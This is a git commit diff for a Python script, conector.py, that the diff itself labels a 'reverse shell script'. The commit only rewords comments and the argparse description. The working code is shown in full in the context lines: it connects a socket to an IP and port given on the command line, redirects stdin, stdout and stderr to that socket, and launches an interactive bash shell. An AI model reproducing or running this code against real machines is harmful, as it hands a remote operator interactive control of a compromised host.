3c1755a20b8a28ba3f0e8c572802201425845582
mirazsarker <mirazsarker04@gmail.com>
2025-08-22 03:56:24 -0700

    Update conector.py

--- conector.py
+++ conector.py
@@ -3,17 +3,16 @@ import subprocess
 import os
 import argparse
 
-# Set up argument parser
-parser = argparse.ArgumentParser(description="Connect to a remote server and start a shell")
-parser.add_argument('-ip', '--host', required=True, help="Server IP address")
-parser.add_argument('-p', '--port', type=int, required=True, help="Server port number")
-
-# Parse arguments
+# Setup argument parser
+parser = argparse.ArgumentParser(description="Reverse shell script")
+parser.add_argument("-ip", "--host", required=True, help="Server IP address")
+parser.add_argument("-p", "--port", type=int, required=True, help="Server port number")
 args = parser.parse_args()
+
 HOST = args.host
 PORT = args.port
 
-# Create socket and connect
+# Connect to server
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
 
@@ -22,5 +21,5 @@ os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
 
-# Start a shell
+# Start an interactive shell
 subprocess.call(["/bin/bash", "-i"])
